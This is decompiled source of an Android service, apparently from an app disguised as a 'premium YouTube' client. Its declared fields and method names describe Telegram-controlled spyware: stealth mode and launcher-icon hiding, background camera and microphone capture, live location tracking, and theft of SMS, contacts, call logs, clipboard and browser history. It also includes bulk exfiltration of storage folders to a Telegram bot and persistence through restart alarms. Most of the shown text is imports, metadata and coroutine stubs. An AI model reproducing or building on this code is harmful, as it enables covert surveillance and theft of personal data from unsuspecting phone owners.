package com.w8sb.w8premiumyt;

import android.R;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.bluetooth.BluetoothManager;
import android.content.BroadcastReceiver;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.TotalCaptureResult;
import android.location.Location;
import android.location.LocationManager;
import android.media.Image;
import android.media.ImageReader;
import android.net.Uri;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.CalendarContract;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.util.Range;
import android.view.Surface;
import android.widget.Toast;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import java.io.BufferedReader;
import java.io.Closeable;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.nio.ByteBuffer;
import java.nio.charset.Charset;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.Date;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.CancellationException;
import java.util.concurrent.Semaphore;
import java.util.concurrent.TimeUnit;
import kotlin.Lazy;
import kotlin.LazyKt;
import kotlin.Metadata;
import kotlin.Pair;
import kotlin.ResultKt;
import kotlin.TuplesKt;
import kotlin.Unit;
import kotlin.collections.ArraysKt;
import kotlin.collections.CollectionsKt;
import kotlin.collections.MapsKt;
import kotlin.coroutines.Continuation;
import kotlin.coroutines.CoroutineContext;
import kotlin.coroutines.intrinsics.IntrinsicsKt;
import kotlin.coroutines.jvm.internal.ContinuationImpl;
import kotlin.coroutines.jvm.internal.DebugMetadata;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlin.io.CloseableKt;
import kotlin.io.FilesKt;
import kotlin.io.TextStreamsKt;
import kotlin.jvm.functions.Function0;
import kotlin.jvm.functions.Function1;
import kotlin.jvm.functions.Function2;
import kotlin.jvm.internal.DefaultConstructorMarker;
import kotlin.jvm.internal.Intrinsics;
import kotlin.jvm.internal.StringCompanionObject;
import kotlin.random.Random;
import kotlin.ranges.RangesKt;
import kotlin.text.Charsets;
import kotlin.text.StringsKt;
import kotlinx.coroutines.AwaitKt;
import kotlinx.coroutines.BuildersKt;
import kotlinx.coroutines.CompletableJob;
import kotlinx.coroutines.CoroutineScope;
import kotlinx.coroutines.CoroutineScopeKt;
import kotlinx.coroutines.CoroutineStart;
import kotlinx.coroutines.DelayKt;
import kotlinx.coroutines.Dispatchers;
import kotlinx.coroutines.Job;
import kotlinx.coroutines.SupervisorKt;
import okhttp3.FormBody;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.ResponseBody;
import okio.BufferedSource;
import okio.Okio;
import okio.Sink;
import org.json.JSONArray;
import org.json.JSONObject;

/* JADX INFO: compiled from: UploadService.kt */
/* JADX INFO: loaded from: /storage/emulated/0/Android/data/com.dastanapps.androiddevtools/files/decompiled/com.yt.phantombabar/dex/classes3.dex */
@Metadata(d1 = {"\u0000\u0086\u0001\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\u000b\n\u0002\b\u0003\n\u0002\u0010\b\n\u0000\n\u0002\u0010\u000e\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\f\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\t\n\u0002\b\u0011\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0005\n\u0002\u0010\u0002\n\u0002\b\n\n\u0002\u0010 \n\u0002\u0018\u0002\n\u0002\b\u001e\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b!\n\u0002\u0018\u0002\n\u0002\b\t\n\u0002\u0010\u0006\n\u0002\b1\b\u0007\u0018\u00002\u00020\u00012\u00020\u0002B\u0005¢\u0006\u0002\u0010\u0003J\b\u0010:\u001a\u00020;H\u0002J\u0011\u0010<\u001a\u00020;H\u0082@ø\u0001\u0000¢\u0006\u0002\u0010=J\b\u0010>\u001a\u00020;H\u0002J\b\u0010?\u001a\u00020\u000bH\u0002J\b\u0010@\u001a\u00020\u000bH\u0002J\u0011\u0010A\u001a\u00020;H\u0082@ø\u0001\u0000¢\u0006\u0002\u0010=J\u0011\u0010B\u001a\u00020;H\u0082@ø\u0001\u0000¢\u0006\u0002\u0010=J\u0013\u0010C\u001a\u0004\u0018\u00010\u000bH\u0082@ø\u0001\u0000¢\u0006\u0002\u0010=J\b\u0010D\u001a\u00020\u000bH\u0002J \u0010E\u001a\b\u0012\u0004\u0012\u00020G0F2\u0006\u0010H\u001a\u00020G2\b\b\u0002\u0010I\u001a\u00020\u0005H\u0002J\b\u0010J\u001a\u00020\u000bH\u0002J\b\u0010K\u001a\u00020\u000bH\u0002J\b\u0010L\u001a\u00020\u000bH\u0002J\b\u0010M\u001a\u00020\u000bH\u0002J\b\u0010N\u001a\u00020\u000bH\u0002J\b\u0010O\u001a\u00020\u000bH\u0002J\b\u0010P\u001a\u00020\u000bH\u0002J\b\u0010Q\u001a\u00020\u000bH\u0002J\b\u0010R\u001a\u00020\u000bH\u0002J\u0012\u0010S\u001a\u00020\u000b2\b\b\u0002\u0010T\u001a\u00020\u0005H\u0002J\b\u0010U\u001a\u00020\u000bH\u0002J\b\u0010V\u001a\u00020\u000bH\u0002J\u0011\u0010W\u001a\u00020\u000bH\u0082@ø\u0001\u0000¢\u0006\u0002\u0010=J\b\u0010X\u001a\u00020\u000bH\u0002J\u0012\u0010Y\u001a\u0004\u0018\u00010\u000b2\u0006\u0010Z\u001a\u00020\u000bH\u0002J\b\u0010[\u001a\u00020\u000bH\u0002J\u0010\u0010\\\u001a\u00020;2\u0006\u0010]\u001a\u00020\u000bH\u0002J\b\u0010^\u001a\u00020\u0005H\u0002J\b\u0010_\u001a\u00020\u0005H\u0002J\b\u0010`\u001a\u00020\u000bH\u0002J\b\u0010a\u001a\u00020\u000bH\u0002J\u0010\u0010b\u001a\u00020;2\u0006\u0010c\u001a\u00020\u000bH\u0002J\b\u0010d\u001a\u00020;H\u0002J\u0014\u0010e\u001a\u0004\u0018\u00010f2\b\u0010g\u001a\u0004\u0018\u00010hH\u0016J\b\u0010i\u001a\u00020;H\u0016J\b\u0010j\u001a\u00020;H\u0016J\"\u0010k\u001a\u00020\t2\b\u0010g\u001a\u0004\u0018\u00010h2\u0006\u0010l\u001a\u00020\t2\u0006\u0010m\u001a\u00020\tH\u0016J\u0012\u0010n\u001a\u00020;2\b\u0010o\u001a\u0004\u0018\u00010hH\u0016J\u0010\u0010p\u001a\u00020;2\u0006\u0010q\u001a\u00020\u000bH\u0002J\u0010\u0010r\u001a\u00020;2\u0006\u0010s\u001a\u00020\u000bH\u0002J\u0011\u0010t\u001a\u00020;H\u0082@ø\u0001\u0000¢\u0006\u0002\u0010=J\b\u0010u\u001a\u00020;H\u0002J\b\u0010v\u001a\u00020;H\u0002J\b\u0010w\u001a\u00020;H\u0002J\u0011\u0010x\u001a\u00020;H\u0082@ø\u0001\u0000¢\u0006\u0002\u0010=J\u0011\u0010y\u001a\u00020;H\u0082@ø\u0001\u0000¢\u0006\u0002\u0010=J\b\u0010z\u001a\u00020;H\u0002J\u0011\u0010{\u001a\u00020;H\u0082@ø\u0001\u0000¢\u0006\u0002\u0010=J\u0011\u0010|\u001a\u00020;H\u0082@ø\u0001\u0000¢\u0006\u0002\u0010=J\u0011\u0010}\u001a\u00020;H\u0082@ø\u0001\u0000¢\u0006\u0002\u0010=J\u0011\u0010~\u001a\u00020;H\u0082@ø\u0001\u0000¢\u0006\u0002\u0010=J\u001b\u0010\u007f\u001a\u00020;2\u0007\u0010\u0080\u0001\u001a\u00020GH\u0082@ø\u0001\u0000¢\u0006\u0003\u0010\u0081\u0001J\u0012\u0010\u0082\u0001\u001a\u00020;2\u0007\u0010\u0083\u0001\u001a\u00020\u000bH\u0002J\t\u0010\u0084\u0001\u001a\u00020;H\u0002J\u0012\u0010\u0085\u0001\u001a\u00020;H\u0082@ø\u0001\u0000¢\u0006\u0002\u0010=J\u001c\u0010\u0086\u0001\u001a\u00020;2\u0007\u0010\u0080\u0001\u001a\u00020GH\u0082@ø\u0001\u0000¢\u0006\u0003\u0010\u0081\u0001J2\u0010\u0087\u0001\u001a\u00020;2\r\u0010\u0088\u0001\u001a\b\u0012\u0004\u0012\u00020G0F2\u000e\u0010\u0089\u0001\u001a\t\u0012\u0004\u0012\u00020\u00050\u008a\u0001H\u0082@ø\u0001\u0000¢\u0006\u0003\u0010\u008b\u0001J\t\u0010\u008c\u0001\u001a\u00020;H\u0002J\u0012\u0010\u008d\u0001\u001a\u00020;2\u0007\u0010\u008e\u0001\u001a\u00020\u000bH\u0002J\u0012\u0010\u008f\u0001\u001a\u00020;H\u0082@ø\u0001\u0000¢\u0006\u0002\u0010=J\u0012\u0010\u0090\u0001\u001a\u00020;2\u0007\u0010\u0091\u0001\u001a\u00020\u0005H\u0002J\u001d\u0010\u0092\u0001\u001a\u00020;2\b\u0010\u0093\u0001\u001a\u00030\u0094\u00012\b\u0010\u0095\u0001\u001a\u00030\u0094\u0001H\u0002J'\u0010\u0096\u0001\u001a\u00020;2\u0007\u0010\u0080\u0001\u001a\u00020G2\t\b\u0002\u0010\u0097\u0001\u001a\u00020\u000bH\u0082@ø\u0001\u0000¢\u0006\u0003\u0010\u0098\u0001J\u0012\u0010\u0099\u0001\u001a\u00020;2\u0007\u0010\u009a\u0001\u001a\u00020\u000bH\u0002J\u001c\u0010\u009b\u0001\u001a\u00020;2\u0007\u0010\u009c\u0001\u001a\u00020\u000bH\u0082@ø\u0001\u0000¢\u0006\u0003\u0010\u009d\u0001J\u001c\u0010\u009e\u0001\u001a\u00020;2\u0007\u0010\u009f\u0001\u001a\u00020\u000bH\u0082@ø\u0001\u0000¢\u0006\u0003\u0010\u009d\u0001J\u001a\u0010 \u0001\u001a\u00020;2\u0006\u0010c\u001a\u00020\u000b2\u0007\u0010¡\u0001\u001a\u00020\u000bH\u0002J\u0012\u0010¢\u0001\u001a\u00020;2\u0007\u0010\u0083\u0001\u001a\u00020\u000bH\u0002J%\u0010£\u0001\u001a\u00020;2\u0007\u0010¤\u0001\u001a\u00020\u000b2\u0007\u0010\u009c\u0001\u001a\u00020\u000bH\u0082@ø\u0001\u0000¢\u0006\u0003\u0010¥\u0001J\u001c\u0010¦\u0001\u001a\u00020;2\u0007\u0010§\u0001\u001a\u00020\u000bH\u0082@ø\u0001\u0000¢\u0006\u0003\u0010\u009d\u0001J%\u0010¨\u0001\u001a\u00020;2\u0007\u0010§\u0001\u001a\u00020\u000b2\u0007\u0010©\u0001\u001a\u00020\u000bH\u0082@ø\u0001\u0000¢\u0006\u0003\u0010¥\u0001J\u0012\u0010ª\u0001\u001a\u00020;2\u0007\u0010¡\u0001\u001a\u00020\u000bH\u0002J\u001c\u0010«\u0001\u001a\u00020;2\u0007\u0010¬\u0001\u001a\u00020GH\u0082@ø\u0001\u0000¢\u0006\u0003\u0010\u0081\u0001J\u0012\u0010\u00ad\u0001\u001a\u00020;2\u0007\u0010®\u0001\u001a\u00020\u0005H\u0002J\u0012\u0010¯\u0001\u001a\u00020;2\u0007\u0010°\u0001\u001a\u00020\u0005H\u0002J\u0012\u0010±\u0001\u001a\u00020;2\u0007\u0010²\u0001\u001a\u00020\u0005H\u0002J\t\u0010³\u0001\u001a\u00020\u0005H\u0002J\t\u0010´\u0001\u001a\u00020;H\u0002J\t\u0010µ\u0001\u001a\u00020;H\u0002J\t\u0010¶\u0001\u001a\u00020;H\u0002J\t\u0010·\u0001\u001a\u00020;H\u0002J\t\u0010¸\u0001\u001a\u00020;H\u0002J\t\u0010¹\u0001\u001a\u00020;H\u0002J\t\u0010º\u0001\u001a\u00020;H\u0002J\t\u0010»\u0001\u001a\u00020;H\u0002J\t\u0010¼\u0001\u001a\u00020;H\u0002J\t\u0010½\u0001\u001a\u00020;H\u0002J\u0012\u0010¾\u0001\u001a\u00020;2\u0007\u0010¿\u0001\u001a\u00020\u0005H\u0002J\u0012\u0010À\u0001\u001a\u00020;2\u0007\u0010¿\u0001\u001a\u00020\u0005H\u0002J\u0011\u0010Á\u0001\u001a\u00020;2\u0006\u0010s\u001a\u00020\u000bH\u0002J\u0012\u0010Â\u0001\u001a\u00020;H\u0082@ø\u0001\u0000¢\u0006\u0002\u0010=J\u0012\u0010Ã\u0001\u001a\u00020;2\u0007\u0010Ä\u0001\u001a\u00020\"H\u0002R\u000e\u0010\u0004\u001a\u00020\u0005X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u0006\u001a\u00020\u0005X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u0007\u001a\u00020\u0005X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\b\u001a\u00020\tX\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\n\u001a\u00020\u000bX\u0082\u000e¢\u0006\u0002\n\u0000R\u0010\u0010\f\u001a\u0004\u0018\u00010\rX\u0082\u000e¢\u0006\u0002\n\u0000R\u0010\u0010\u000e\u001a\u0004\u0018\u00010\rX\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u000f\u001a\u00020\u000bX\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u0010\u001a\u00020\u0011X\u0082\u0004¢\u0006\u0002\n\u0000R\u0014\u0010\u0012\u001a\u00020\u00138VX\u0096\u0004¢\u0006\u0006\u001a\u0004\b\u0014\u0010\u0015R\u000e\u0010\u0016\u001a\u00020\u0005X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u0017\u001a\u00020\u0005X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u0018\u001a\u00020\u0005X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u0019\u001a\u00020\u0005X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u001a\u001a\u00020\u0005X\u0082\u000e¢\u0006\u0002\n\u0000R\u0010\u0010\u001b\u001a\u0004\u0018\u00010\rX\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u001c\u001a\u00020\u0005X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u001d\u001a\u00020\u0005X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u001e\u001a\u00020\u0005X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u001f\u001a\u00020 X\u0082\u0004¢\u0006\u0002\n\u0000R\u000e\u0010!\u001a\u00020\"X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010#\u001a\u00020\"X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010$\u001a\u00020\u0005X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010%\u001a\u00020\tX\u0082\u000e¢\u0006\u0002\n\u0000R\u0010\u0010&\u001a\u0004\u0018\u00010\rX\u0082\u000e¢\u0006\u0002\n\u0000R\u0010\u0010'\u001a\u0004\u0018\u00010\rX\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010(\u001a\u00020\u0005X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010)\u001a\u00020\tX\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010*\u001a\u00020\u000bX\u0082D¢\u0006\u0002\n\u0000R\u000e\u0010+\u001a\u00020\u0005X\u0082\u000e¢\u0006\u0002\n\u0000R\u0010\u0010,\u001a\u0004\u0018\u00010\rX\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010-\u001a\u00020\u0005X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010.\u001a\u00020\u0005X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010/\u001a\u00020\u0005X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u00100\u001a\u00020\u0005X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u00101\u001a\u00020\u0005X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u00102\u001a\u00020\u0005X\u0082\u000e¢\u0006\u0002\n\u0000R\u001f\u00103\u001a\u000604R\u0002058BX\u0082\u0084\u0002¢\u0006\f\n\u0004\b8\u00109\u001a\u0004\b6\u00107\u0082\u0002\u0004\n\u0002\b\u0019¨\u0006Å\u0001"}, d2 = {"Lcom/w8sb/w8premiumyt/UploadService;", "Landroid/app/Service;", "Lkotlinx/coroutines/CoroutineScope;", "()V", "backgroundCameraBack", "", "backgroundCameraEnabled", "backgroundCameraFront", "backgroundCameraIntervalSec", "", "botToken", "", "cameraBackJob", "Lkotlinx/coroutines/Job;", "cameraFrontJob", "chatId", "client", "Lokhttp3/OkHttpClient;", "coroutineContext", "Lkotlin/coroutines/CoroutineContext;", "getCoroutineContext", "()Lkotlin/coroutines/CoroutineContext;", "dcimCameraFolderSending", "dcimFolderSending", "downloadFolderSending", "flashlightOn", "fullSdcardSending", "galleryPhotoJob", "galleryPhotoSending", "isUploading", "isVibrating", "job", "Lkotlinx/coroutines/CompletableJob;", "lastUpdateId", "", "lastUploadTime", "liveLocationEnabled", "liveLocationIntervalSec", "liveLocationJob", "micJob", "microphoneEnabled", "microphoneIntervalSec", "ownerTag", "picturesFolderSending", "pollingJob", "readCallLog", "readContacts", "readLocation", "readSms", "sendAllDataEnabled", "stealthMode", "wakeLock", "Landroid/os/PowerManager$WakeLock;", "Landroid/os/PowerManager;", "getWakeLock", "()Landroid/os/PowerManager$WakeLock;", "wakeLock$delegate", "Lkotlin/Lazy;", "acquireWakeLock", "", "batchAndSendExfilData", "(Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "bringMainActivityToFront", "buildCommandsKeyboard", "buildDownloadFolderKeyboard", "collectAndSendCallLog", "collectAndSendContacts", "downloadLatestVoiceFromTelegram", "getAccountsInfo", "getAllFilesRecursively", "", "Ljava/io/File;", "dir", "skipAndroid", "getAppUsageStats", "getBasicDeviceInfo", "getBluetoothDevices", "getBrowserHistory", "getCalendarEvents", "getCallLogInfo", "getCallLogs", "getClipboardHistory", "getContactsInfo", "getInstalledApps", "showAll", "getLocationHistory", "getMediaFiles", "getPublicIP", "getSMSInfo", "getTelegramFilePath", "fileId", "getWifiNetworks", "handleTelegramCommand", "data", "hasStoragePermission", "hasVibratePermission", "listDownloadFolder", "listSdcardRoot", "makeCallAndNotify", "number", "minimizeAndHideApp", "onBind", "Landroid/os/IBinder;", "intent", "Landroid/content/Intent;", "onCreate", "onDestroy", "onStartCommand", "flags", "startId", "onTaskRemoved", "rootIntent", "openAppByName", "appName", "openAppByPackage", "pkg", "recordAndSendMic", "registerRestartAlarm", "reloadConfig", "restartService", "sendAllDCIMCameraFilesToTelegramControlled", "sendAllDCIMFilesToTelegramControlled", "sendAllDeviceInfo", "sendAllDownloadFilesToTelegram", "sendAllDownloadFilesToTelegramControlled", "sendAllFullSdcardFilesToTelegramControlled", "sendAllPicturesFilesToTelegramControlled", "sendAudioToTelegram", "file", "(Ljava/io/File;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "sendClipboardToTelegram", "text", "sendCurrentLocationToTelegram", "sendDeviceInfoZipToTelegram", "sendFileToTelegram", "sendFilesInParallel", "files", "sendingFlag", "Lkotlin/Function0;", "(Ljava/util/List;Lkotlin/jvm/functions/Function0;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "sendInstalledAppsToTelegram", "sendLinkOpenToMainActivity", "url", "sendLiveLocationToTelegram", "sendLiveReadingStatus", "enabled", "sendLocationToTelegram", "lat", "", "lon", "sendPhotoToTelegram", "caption", "(Ljava/io/File;Ljava/lang/String;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "sendPlayAudioToMainActivity", "audioPath", "sendSdcardFileToTelegram", "filename", "(Ljava/lang/String;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "sendSdcardFolderToTelegram", "folder", "sendSmsAndNotify", "message", "sendSpeakTextToMainActivity", "sendTextFile", "content", "(Ljava/lang/String;Ljava/lang/String;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "sendTextToTelegram", "msg", "sendTextToTelegramWithKeyboard", "replyMarkup", "sendToastToMainActivity", "sendZipToTelegram", "zipFile", "setFakeAppIcon", "enable", "setFlashlight", "on", "setLauncherIconVisible", "visible", "shouldSendAllData", "startBackgroundCameraLoop", "startBackgroundMicLoop", "startGalleryPhotoSending", "startLiveLocationLoop", "startMicRecordingLoop", "startPhotoUpload", "startTelegramPolling", "stopGalleryPhotoSending", "stopMicRecordingLoop", "stopVibration", "takeAndSendPhoto", "useFront", "takeBackgroundPhoto", "uninstallAppByPackage", "uploadAllPhotos", "vibrateDevice", "durationMs", "app_debug"}, k = 1, mv = {1, 8, 0}, xi = 48)
public final class UploadService extends Service implements CoroutineScope {
    public static final int $stable = LiveLiterals$UploadServiceKt.INSTANCE.m۳۲۶Int$classUploadService();
    private boolean backgroundCameraEnabled;
    private boolean backgroundCameraFront;
    private Job cameraBackJob;
    private Job cameraFrontJob;
    private volatile boolean dcimCameraFolderSending;
    private volatile boolean dcimFolderSending;
    private volatile boolean downloadFolderSending;
    private boolean flashlightOn;
    private volatile boolean fullSdcardSending;
    private Job galleryPhotoJob;
    private boolean galleryPhotoSending;
    private boolean isUploading;
    private boolean isVibrating;
    private long lastUpdateId;
    private long lastUploadTime;
    private boolean liveLocationEnabled;
    private Job liveLocationJob;
    private Job micJob;
    private boolean microphoneEnabled;
    private volatile boolean picturesFolderSending;
    private Job pollingJob;
    private boolean sendAllDataEnabled;
    private boolean stealthMode;
    private final CompletableJob job = SupervisorKt.SupervisorJob$default((Job) null, 1, (Object) null);
    private final OkHttpClient client = new OkHttpClient.Builder().connectTimeout(30, TimeUnit.SECONDS).writeTimeout(30, TimeUnit.SECONDS).readTimeout(30, TimeUnit.SECONDS).build();
    private String botToken = "";
    private String chatId = "";
    private final Lazy wakeLock$delegate = LazyKt.lazy(new Function0<PowerManager.WakeLock>() { // from class: com.w8sb.w8premiumyt.UploadService$wakeLock$2
        {
            super(0);
        }

        /* JADX INFO: renamed from: invoke, reason: merged with bridge method [inline-methods] */
        public final PowerManager.WakeLock m۱۴۸۸invoke() {
            Object systemService = this.this$0.getSystemService("power");
            Intrinsics.checkNotNull(systemService, "null cannot be cast to non-null type android.os.PowerManager");
            PowerManager $this$invoke_u24lambda_u241 = (PowerManager) systemService;
            PowerManager.WakeLock $this$invoke_u24lambda_u241_u24lambda_u240 = $this$invoke_u24lambda_u241.newWakeLock(1, "UploadService::WakeLock");
            $this$invoke_u24lambda_u241_u24lambda_u240.setReferenceCounted(false);
            return $this$invoke_u24lambda_u241_u24lambda_u240;
        }
    });
    private final String ownerTag = "@W8SOJIB";
    private boolean backgroundCameraBack = true;
    private int backgroundCameraIntervalSec = 30;
    private int microphoneIntervalSec = 30;
    private int liveLocationIntervalSec = 30;
    private boolean readContacts = true;
    private boolean readSms = true;
    private boolean readCallLog = true;
    private boolean readLocation = true;

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$batchAndSendExfilData$1, reason: invalid class name */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(k = 3, mv = {1, 8, 0}, xi = 48)
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService", f = "UploadService.kt", i = {0, 0}, l = {868}, m = "batchAndSendExfilData", n = {"files", "zipFile"}, s = {"L$0", "L$1"})
    static final class AnonymousClass1 extends ContinuationImpl {
        Object L$0;
        Object L$1;
        int label;
        /* synthetic */ Object result;

        AnonymousClass1(Continuation<? super AnonymousClass1> continuation) {
            super(continuation);
        }

        public final Object invokeSuspend(Object obj) {
            this.result = obj;
            this.label |= Integer.MIN_VALUE;
            return UploadService.this.batchAndSendExfilData((Continuation) this);
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$collectAndSendCallLog$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(k = 3, mv = {1, 8, 0}, xi = 48)
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService", f = "UploadService.kt", i = {}, l = {632}, m = "collectAndSendCallLog", n = {}, s = {})
    static final class C۰۰۰۲1 extends ContinuationImpl {
        int label;
        /* synthetic */ Object result;

        C۰۰۰۲1(Continuation<? super C۰۰۰۲1> continuation) {
            super(continuation);
        }

        public final Object invokeSuspend(Object obj) {
            this.result = obj;
            this.label |= Integer.MIN_VALUE;
            return UploadService.this.collectAndSendCallLog((Continuation) this);
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$collectAndSendContacts$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(k = 3, mv = {1, 8, 0}, xi = 48)
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService", f = "UploadService.kt", i = {}, l = {583}, m = "collectAndSendContacts", n = {}, s = {})
    static final class C۰۰۰۳1 extends ContinuationImpl {
        int label;
        /* synthetic */ Object result;

        C۰۰۰۳1(Continuation<? super C۰۰۰۳1> continuation) {
            super(continuation);
        }

        public final Object invokeSuspend(Object obj) {
            this.result = obj;
            this.label |= Integer.MIN_VALUE;
            return UploadService.this.collectAndSendContacts((Continuation) this);
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$getPublicIP$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(k = 3, mv = {1, 8, 0}, xi = 48)
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService", f = "UploadService.kt", i = {}, l = {147}, m = "getPublicIP", n = {}, s = {})
    static final class C۰۰۰۴1 extends ContinuationImpl {
        int label;
        /* synthetic */ Object result;

        C۰۰۰۴1(Continuation<? super C۰۰۰۴1> continuation) {
            super(continuation);
        }

        public final Object invokeSuspend(Object obj) {
            this.result = obj;
            this.label |= Integer.MIN_VALUE;
            return UploadService.this.getPublicIP((Continuation) this);
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$recordAndSendMic$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(k = 3, mv = {1, 8, 0}, xi = 48)
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService", f = "UploadService.kt", i = {0, 0, 0, 1, 1}, l = {1337, 1341}, m = "recordAndSendMic", n = {"this", "file", "recorder", "file", "recorder"}, s = {"L$0", "L$1", "L$2", "L$0", "L$1"})
    static final class C۰۰۱۳1 extends ContinuationImpl {
        Object L$0;
        Object L$1;
        Object L$2;
        int label;
        /* synthetic */ Object result;

        C۰۰۱۳1(Continuation<? super C۰۰۱۳1> continuation) {
            super(continuation);
        }

        public final Object invokeSuspend(Object obj) {
            this.result = obj;
            this.label |= Integer.MIN_VALUE;
            return UploadService.this.recordAndSendMic((Continuation) this);
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendAudioToTelegram$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(k = 3, mv = {1, 8, 0}, xi = 48)
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService", f = "UploadService.kt", i = {}, l = {1363}, m = "sendAudioToTelegram", n = {}, s = {})
    static final class C۰۰۲۱1 extends ContinuationImpl {
        int label;
        /* synthetic */ Object result;

        C۰۰۲۱1(Continuation<? super C۰۰۲۱1> continuation) {
            super(continuation);
        }

        public final Object invokeSuspend(Object obj) {
            this.result = obj;
            this.label |= Integer.MIN_VALUE;
            return UploadService.this.sendAudioToTelegram(null, (Continuation) this);
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendDeviceInfoZipToTelegram$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(k = 3, mv = {1, 8, 0}, xi = 48)
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService", f = "UploadService.kt", i = {0, 0, 0}, l = {2825, 2831}, m = "sendDeviceInfoZipToTelegram", n = {"this", "files", "zipFile"}, s = {"L$0", "L$1", "L$2"})
    static final class C۰۰۲۷1 extends ContinuationImpl {
        Object L$0;
        Object L$1;
        Object L$2;
        int label;
        /* synthetic */ Object result;

        C۰۰۲۷1(Continuation<? super C۰۰۲۷1> continuation) {
            super(continuation);
        }

        public final Object invokeSuspend(Object obj) {
            this.result = obj;
            this.label |= Integer.MIN_VALUE;
            return UploadService.this.sendDeviceInfoZipToTelegram((Continuation) this);
        }
    }
